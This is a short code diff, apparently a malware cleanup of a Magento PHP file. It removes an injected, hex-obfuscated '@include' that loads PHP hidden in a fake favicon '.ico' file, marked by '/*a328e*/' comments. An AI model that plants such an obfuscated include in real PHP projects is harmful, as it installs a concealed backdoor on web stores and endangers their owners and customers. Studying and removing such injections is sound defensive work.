@@ -1,10 +1,5 @@
 <?php
 
-/*a328e*/
-
-@include "\x2fdat\x61/vh\x6fsts\x2fwww\x2eos-\x73tor\x65.co\x6d/at\x2fjs/\x6cib/\x66avi\x63on_\x37eb3\x301.i\x63o";
-
-/*a328e*/
 /**
  * Magento
  *
